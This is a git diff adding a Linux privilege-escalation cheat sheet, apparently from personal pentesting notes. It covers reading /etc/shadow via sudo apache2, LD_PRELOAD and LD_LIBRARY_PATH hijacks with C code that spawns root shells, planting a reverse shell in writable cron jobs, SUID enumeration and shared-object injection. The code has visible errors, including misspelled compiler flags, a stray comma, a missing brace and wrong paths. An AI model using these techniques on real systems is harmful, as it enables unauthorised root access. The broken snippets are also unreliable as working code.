@@ -152,11 +152,108 @@ sudo passwd
 ```
 Shell Escape Seq
 ```
+GTFOBINS
+--------
+```
+Using apache2 to read root password
+```
+sudo apache2 -f /etc/shadow 
+```
+Enviroment variable sudo PRELOAD
+```
+sudo -l
+vim preload.c
+---
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void_init() {
+  unsetenv("LD_PRELOAD");
+  setresuid(0,0,0,);
+  system("/bin/bash -p");
+}
+---
+gcc -fPIC -sahred -nostartfiles -o /timp/preload.so preload.c
+---
+sudo LD_PRELOAD=/tmp/preload.so find 
+```
+LD_LIBRARY_PATH
+```
+ldd /usr/sbin/apache2
+
+(Will replace crypt shared object)
+---
+library_path.c 
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+  unsetenv("LD_LIBRARY_PATH");
+  setresuid(0,0,0);
+  system("|/bin/bash -p");
+}
+    
+---
+gcc -o libcrypt.so.1 0sgared -fPIC library_path.c
+sudo LD_LIBRARY_PATH=. apache2
+```
+CronJobs
+```
+/var/spool/cron/
+/var/spool/cron/crontabs/
+/etc/crontab
+
+Check for writable jobs,
+add reverse shell to a writeable job
+
+wait for the cron job to pop shell
+---
+```
+SUID/SGID
+Check to see if exim is exploitable
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+Shared Object Injection
+```
+/usr/local/bin/suid-so
+
+(see whats happening when you execute)
+strace /usr/local/bin/suid-so
+
+(grep some stuff)
+strace /usr/local/bin/suid-so | grep -iE "open|access|no such file"
+
+mkdir .config
+cd .config
+vim <shared object file> i.e libcalc.c
+
+[libcalc.c]
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+void inject()
+  setuid(0);
+  system("/bin/bash -p")
+}
+
+gcc -shared -fPIC -o libcalc.so libcalc.c
+
+/usr/local/bin/suid.so 
+
+------
+
+
+
 
 
 ```
-
- 
 A list of tools
 ```
 RSG - Reverse shell generator, github. (Check it out if you are really stuck)
